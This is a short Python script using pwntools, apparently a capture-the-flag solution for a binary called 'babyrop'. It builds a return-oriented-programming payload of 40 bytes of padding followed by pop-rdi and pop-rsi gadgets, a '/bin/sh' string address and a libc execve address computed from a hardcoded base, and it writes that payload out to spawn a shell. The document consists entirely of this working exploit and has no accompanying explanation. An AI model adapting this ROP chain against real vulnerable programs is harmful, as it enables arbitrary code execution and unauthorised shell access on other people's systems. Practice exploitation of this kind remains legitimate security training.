#from pwn import *

#p=process('./babyrop')

#binsh_addr=0x1b3e9a
#libc_start_main_addr=0x21ab0
#execve_addr=0xe4e30
#pop_rdi_addr=0x400733
#pop_rsi_addr=0x400731 #pop r15;
import sys
import pwn

addr_libc_start_main = 0x0000000000021ab0
addr_libc_execve = 0x00000000000e4e30
addr_libc_binsh = 0x1b3e9a
addr_start_main = 0x7ffff7a05ab0

addr_offset = addr_start_main - addr_libc_start_main
addr_execve = addr_offset + addr_libc_execve
addr_binsh = addr_offset + addr_libc_binsh

rop_pop_rdi = 0x0000000000400733
rop_pop_rsi = 0x0000000000400731

s = b"A" * 40
#s += pwn.p64(0x40063a)
s += pwn.p64(rop_pop_rdi)
s += pwn.p64(addr_binsh)
s += pwn.p64(rop_pop_rsi)
s += pwn.p64(0x0)
s += pwn.p64(0x0)
s += pwn.p64(addr_execve)

sys.stdout.buffer.write(s)